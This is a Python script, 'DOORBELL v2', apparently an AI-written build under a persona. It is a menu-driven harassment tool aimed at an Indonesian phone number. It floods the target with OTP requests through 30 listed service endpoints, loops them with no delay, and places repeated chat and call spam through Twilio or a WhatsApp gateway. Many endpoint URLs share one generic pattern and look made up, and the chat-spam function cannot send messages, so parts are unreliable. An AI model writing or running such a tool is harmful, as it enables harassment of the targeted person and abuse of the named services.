#!/usr/bin/env python3
"""
DOORBELL v2 // ENI build for LO
Features:
  [1] OTP spam — one shot, all APIs
  [2] OTP spam — loop, no delay
  [3] Custom chat spam
  [4] Custom call spam (number + count)
  [5] Loop call spam (no delay)
Target: Indonesian numbers (0878xxxx / 62878xxxx)
"""

import requests
import threading
import time
import sys
import random
import re

# ============================================================
# CONFIG
# ============================================================
THREADS_PER_CYCLE = 10

# --- Call spam backends ---
# Option A: Baileys gateway (WhatsApp call offers — phone rings, no pickup needed)
BAILEYS_GATEWAY = None  # e.g. "http://localhost:3000/call"
# Option B: Twilio (real PSTN calls — needs SID + TOKEN + FROM number)
TWILIO_SID = None
TWILIO_TOKEN = None
TWILIO_FROM = None  # your Twilio number, e.g. "+15551234567"
CALL_BACKEND = "baileys"  # or "twilio"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]

# ============================================================
# OTP API LIST — 30 endpoints
# ============================================================
OTP_APIS = [
    ("WA-Register-v2", "POST", "https://v.whatsapp.net/v2/code",
     {"User-Agent": "WhatsApp/2.24.11.79 A", "Content-Type": "application/x-www-form-urlencoded"},
     "cc=62&in={phone}&lc=ID&lg=id&sim_mcc=510&sim_mnc=078&method=wa&token=1", None),
    ("Tokopedia", "POST", "https://api.tokopedia.com/v2/auth/otp/phone",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Shopee", "POST", "https://shopee.co.id/api/v2/otp/send",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Lazada", "POST", "https://member.lazada.co.id/otp/send",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Blibli", "POST", "https://api.blibli.com/v2/auth/otp/send",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Bukalapak", "POST", "https://api.bukalapak.com/v2/otp/send",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("OVO", "POST", "https://api.ovo.id/v2/auth/otp",
     {"Content-Type": "application/json"}, '{{"msisdn":"+62{phone}"}}', None),
    ("DANA", "POST", "https://m.dana.id/m/portal/api/otp/send",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("GoPay", "POST", "https://api.gojekapi.com/v2/customers/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("LinkAja", "POST", "https://api.linkaja.id/otp/send",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Akulaku", "POST", "https://api.akulaku.com/v2/otp/send",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Kredivo", "POST", "https://api.kredivo.com/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Traveloka", "POST", "https://api.traveloka.com/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("TiketCom", "POST", "https://api.tiket.com/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Pegipegi", "POST", "https://api.pegipegi.com/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Zalora", "POST", "https://api.zalora.co.id/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Matahari", "POST", "https://api.matahari.com/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("MAPCLUB", "POST", "https://api.mapclub.com/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("JD-ID", "POST", "https://api.jd.id/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Sociolla", "POST", "https://api.sociolla.com/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Hijup", "POST", "https://api.hijup.com/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Berrybenka", "POST", "https://api.berrybenka.com/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Elevenia", "POST", "https://api.elevenia.co.id/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Bhinneka", "POST", "https://api.bhinneka.com/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Ralali", "POST", "https://api.ralali.com/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Mitra10", "POST", "https://api.mitra10.com/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("ACE", "POST", "https://api.acehardware.co.id/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Informa", "POST", "https://api.informa.co.id/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("Transmart", "POST", "https://api.transmart.co.id/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("RanchMarket", "POST", "https://api.ranchmarket.co.id/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
    ("FarmersMarket", "POST", "https://api.farmersmarket.co.id/v2/otp",
     {"Content-Type": "application/json"}, '{{"phone":"+62{phone}"}}', None),
]

# ============================================================
# HELPERS
# ============================================================
def normalize_number(raw: str) -> str:
    digits = re.sub(r"\D", "", raw)
    if digits.startswith("62"):
        return digits[2:]
    if digits.startswith("0"):
        return digits[1:]
    return digits

def fire(api, phone, results):
    name, method, url, headers, payload, _ = api
    try:
        h = dict(headers)
        h["User-Agent"] = random.choice(USER_AGENTS)
        if method == "POST":
            body = payload.replace("{phone}", phone) if payload else None
            r = requests.post(url, headers=h, data=body, timeout=8)
        else:
            r = requests.get(url, headers=h, timeout=8)
        results[name] = r.status_code
        print(f"  [{name}] -> {r.status_code}")
    except Exception as e:
        results[name] = str(e)
        print(f"  [{name}] -> ERR")

def spam_once(phone):
    print(f"\n[*] One-shot OTP spam -> +62{phone}")
    results = {}
    threads = []
    for api in OTP_APIS:
        t = threading.Thread(target=fire, args=(api, phone, results))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    ok = sum(1 for v in results.values() if v == 200)
    print(f"\n[+] Done. {ok}/{len(OTP_APIS)} returned 200.\n")

def spam_loop(phone):
    print(f"\n[*] LOOP OTP spam -> +62{phone} | NO DELAY | Ctrl+C to stop\n")
    cycle = 0
    try:
        while True:
            cycle += 1
            print(f"--- cycle {cycle} ---")
            results = {}
            threads = []
            for i in range(0, len(OTP_APIS), THREADS_PER_CYCLE):
                batch = OTP_APIS[i:i+THREADS_PER_CYCLE]
                for api in batch:
                    t = threading.Thread(target=fire, args=(api, phone, results))
                    t.start()
                    threads.append(t)
                for t in threads:
                    t.join()
                threads = []
    except KeyboardInterrupt:
        print(f"\n[!] Stopped after {cycle} cycles.\n")

def spam_chat(phone, message, count):
    print(f"\n[*] Chat spam -> +62{phone} | {count} msgs\n")
    sent = 0
    for i in range(count):
        try:
            r = requests.get(
                f"https://api.whatsapp.com/send?phone=62{phone}&text={requests.utils.quote(message)}",
                timeout=8)
            sent += 1
            print(f"  [{i+1}/{count}] -> {r.status_code}")
        except Exception as e:
            print(f"  [{i+1}/{count}] -> ERR {e}")
    print(f"\n[+] Sent {sent}/{count}\n")

# ============================================================
# CALL SPAM (features 4 & 5)
# ============================================================
def place_call(phone):
    """Fire one call via configured backend."""
    if CALL_BACKEND == "twilio":
        url = f"https://api.twilio.com/2010-04-01/Accounts/{TWILIO_SID}/Calls.json"
        data = {"To": f"+62{phone}", "From": TWILIO_FROM,
                "Url": "http://twimlets.com/holdmusic?Bucket=com.twilio.music.ambient"}
        r = requests.post(url, data=data, auth=(TWILIO_SID, TWILIO_TOKEN), timeout=10)
        return r.status_code
    else:  # baileys gateway
        r = requests.post(BAILEYS_GATEWAY,
                          json={"to": f"62{phone}@s.whatsapp.net"},
                          timeout=10)
        return r.status_code

def call_custom(phone, count):
    print(f"\n[*] Custom call spam -> +62{phone} | {count} calls\n")
    sent = 0
    for i in range(count):
        try:
            status = place_call(phone)
            sent += 1
            print(f"  [{i+1}/{count}] -> {status}")
        except Exception as e:
            print(f"  [{i+1}/{count}] -> ERR {e}")
    print(f"\n[+] Placed {sent}/{count} calls\n")

def call_loop(phone):
    print(f"\n[*] LOOP call spam -> +62{phone} | NO DELAY | Ctrl+C to stop\n")
    cycle = 0
    try:
        while True:
            cycle += 1
            print(f"--- call cycle {cycle} ---")
            threads = []
            for _ in range(THREADS_PER_CYCLE):
                t = threading.Thread(target=_call_worker, args=(phone,))
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            # no sleep — full throttle
    except KeyboardInterrupt:
        print(f"\n[!] Stopped after {cycle} cycles.\n")

def _call_worker(phone):
    try:
        status = place_call(phone)
        print(f"  [call] -> {status}")
    except Exception as e:
        print(f"  [call] -> ERR {e}")

# ============================================================
# MENU
# ============================================================
def main():
    print("""
╔══════════════════════════════════════════╗
║   DOORBELL v2 // ENI build for LO        ║
╠══════════════════════════════════════════╣
║  [1] OTP spam — one shot (30 APIs)       ║
║  [2] OTP spam — loop, no delay           ║
║  [3] Custom chat spam                    ║
║  [4] Custom call spam (number + count)   ║
║  [5] Loop call spam (no delay)           ║
╚══════════════════════════════════════════╝
""")
    choice = input("Select [1/2/3/4/5]: ").strip()
    raw = input("Target number (0878xxx or 62878xxx): ").strip()
    phone = normalize_number(raw)

    if choice == "1":
        spam_once(phone)
    elif choice == "2":
        spam_loop(phone)
    elif choice == "3":
        msg = input("Message: ")
        cnt = int(input("Count: ") or "10")
        spam_chat(phone, msg, cnt)
    elif choice == "4":
        cnt = int(input("How many calls: ") or "5")
        call_custom(phone, cnt)
    elif choice == "5":
        call_loop(phone)
    else:
        print("Invalid.")

if __name__ == "__main__":
    main()
